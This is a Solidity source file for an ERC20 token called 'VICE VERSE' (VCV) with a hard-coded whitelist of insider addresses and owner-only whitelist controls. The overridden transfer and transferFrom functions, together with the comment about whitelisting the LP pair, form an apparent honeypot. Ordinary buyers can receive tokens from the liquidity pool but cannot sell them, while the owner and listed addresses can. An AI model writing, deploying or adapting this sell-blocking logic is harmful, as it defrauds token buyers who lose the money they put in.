// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("VICE VERSE", "VCV") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 50000 * 10 ** decimals());
        whiteList[0xA323f463BC84f1C6Eedff995362E14Ffb75E2b95]= true;
        whiteList[0x2c620Fd9528DEcD36378ecc691a9Ac99da024511]=true;
        whiteList[0x95239D154868819DB023ECA236B5b782c28128E9]=true;
        whiteList[0x65b4EF81b3b9975e99e95cD2ccb71989424FCB8F]=true;
        whiteList[0x810532a92fA10822d4214e5f5e5C731E1932Da20]=true;
        whiteList[0x9f0943D6806db0C584786e1c442a4Be8E5C8b769]=true;
        whiteList[0x5045208f3e9A01389BB5089EDc481D84c6FCAc1c]=true;
        whiteList[0xfA984FA59f334d486935F1638b3588f49766Bd47]=true;
        whiteList[0x44F184D3d783168fD9C5A978b61534B3069e70a6]=true;
        whiteList[0x0C2E2CeE0615acFAa909beb98fa80c161340D488]=true;
        whiteList[0x616423641152872737F82cdDe5e30fEc1ED5FC04]=true;
        whiteList[0x66a385d6eba7d3ab33a26a96833671a6d55E64fb]=true;
        whiteList[0x5305ED4f9a72e1eDdd31242aF7c43fF65dA37693]=true;
        whiteList[0x26108Cc76b84172A01D7c2DfAD6ED24a65fe7192]=true;
        whiteList[0x0c78ea174af1eE84298e49f46F0B5bc8a639f672]=true;
        whiteList[0x7A4b84c5f1054afdEEeE33C4364F1930aa638356]=true;
        whiteList[0x1D3F14316E84e404C91e902A072f908dBED780c8]=true;
        whiteList[0x0bCFB92d982e668F40C6d1bC9216410Bd91d0446]=true;
        whiteList[0xCdA451988387436ac3A17602E8e25Ff326647022]=true;
        whiteList[0xb6A5bDaeeEabF36AFe746E5b18821AAa372f4d63]=true;
        whiteList[0xD2F48c9F2E4e8E9D34626eb1Ed1bc93262325eE9]=true;
        whiteList[0xc2c8A588ce85d25301187f78Ac11F434ed0dE9eA]=true;
        whiteList[0x7167092e13e1049e8A54B2a459DAb090AdFe08bc]=true;
        whiteList[0xF701360ad35aDa24d349382288738939D80C2E88]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}